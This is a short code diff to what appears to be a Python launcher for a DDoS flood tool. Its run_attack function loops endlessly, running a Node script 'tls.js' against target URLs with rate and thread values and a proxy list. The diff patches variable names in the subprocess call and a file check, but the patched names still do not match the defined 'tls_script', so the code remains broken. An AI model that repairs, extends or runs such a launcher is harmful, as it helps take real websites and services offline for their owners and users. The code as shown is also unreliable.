@@ -98,7 +98,7 @@ def run_attack(urls):
         while True:
             try:
                 result = subprocess.run(
-                    ["node", tls.js, url, "6000", "64", "10", proxy_file],
+                    ["node", tls, url, "6000", "64", "10", proxy_file],
                     capture_output=True,
                     text=True
                 )
@@ -188,7 +188,7 @@ tls_script = 'tls.js'
 proxy_file = 'proxy.txt'
 
 if not os.path.isfile(tls_script):
-    raise FileNotFoundError(f"Error: File {tls.js} tidak ditemukan.")
+    raise FileNotFoundError(f"Error: File {tls_js} tidak ditemukan.")
 
 if not os.path.isfile(proxy_file):
     raise FileNotFoundError(f"Error: File {proxy_file} tidak ditemukan.")
